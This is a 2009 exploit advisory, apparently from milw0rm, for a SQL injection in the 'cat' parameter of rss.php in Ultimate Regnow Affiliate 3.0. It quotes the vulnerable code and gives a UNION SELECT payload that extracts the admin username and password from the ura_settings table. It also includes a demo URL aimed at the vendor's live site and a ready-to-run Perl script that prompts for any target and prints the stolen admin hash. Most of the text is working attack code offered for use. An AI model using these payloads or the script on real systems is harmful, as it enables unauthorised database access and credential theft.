<html><head><title>URA 3.0 (cat) remote SQL injection Vulnerability</title></head><pre>---------------------------------------------------
URA 3.0 (cat) remote SQL injection Vulnerability
---------------------------------------------------
 ###################################################
 [+] Author        :  Chip D3 Bi0s
 [+] Email         :  chipdebios[alt+64]gmail.com
 [+] Group         :  LatinHackTeam
 [+] Vulnerability :  SQL injection
 ###################################################

---------info Cms----------------
Name     : Ultimate Regnow Affiliate
Email    : support@phpsugar.com
Dowloand : http://www.phpsugar.com/ura_order.html
Web      : http://www.phpsugar.com
Price    : $27 USD
---------------------------------

vulnerable code in rss.php

........
7. $cat = $_GET['cat'];
8. 
9. if(empty($cat)) {
10 .$query = &quot;SELECT ProductID, ProductName, VendorName, LongDesc FROM ura_items WHERE CategoryID != 0 AND CategoryID != 1 AND CategoryID != 2 ORDER BY Add_Date DESC LIMIT 10&quot;;
11. }
12. else { 
13. $query = &quot;SELECT * FROM ura_items WHERE CategoryID = $cat ORDER BY Add_Date DESC limit $no&quot;;
14. }

.....
	
example of exploitation:
http://localhost/path/rss.php?cat=0[Sql-Code]

[Sql-Code]:
+union+select+1,concat(username,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from+ura_settings/*

live Demo: 
http://www.phpsugar.com/ura_demo/rss.php?cat=0+union+select+1,concat(username,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from+ura_settings/*

.....

#!/usr/bin/perl -w
########################################
#[+] Author : Chip D3 Bi0s
#[+] Contact: chipdebios[alt+64]gmail.com 
########################################
print &quot;\t\t--------------------------------------------------\n\n&quot;;
print &quot;\t\t|                  ---|Chip D3 Bi0s|---           |\n\n&quot;;
print &quot;\t\t---------------------------------------------------\n\n&quot;;
print &quot;\t\t|URA 3.0 (cat) remote SQL injection Vulnerability |  \n\n&quot;;
print &quot;\t\t---------------------------------------------------\n\n&quot;;
use LWP::UserAgent;
print &quot;\nEnter url of vuln site [http://wwww.example.com/path]: &quot;;
chomp(my $target=&lt;STDIN&gt;);
$column_name=&quot;concat(0x215F,username,char(58),pass,0x215F)&quot;;
$table_name=&quot;ura_settings&quot;;
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . &quot;/rss.php?cat=0+union+select+1,&quot;.$column_name.&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20+from/**/&quot;.$table_name.&quot;/*&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;
if($answer =~ /!_(.+?)!_/i)
{
     print &quot;\n[+] Admin Hash : $1\n\n&quot;;
     print &quot;&gt; Exploit done! &lt;\n\n&quot;;

}


else{print &quot;\n&gt; Exploit failed! &lt;\n&quot;;
}

#+++++++++++++++++++++++++++++++++
#[!] Produced in South America
#---------------------------------

# milw0rm.com [2009-07-27]</pre></html>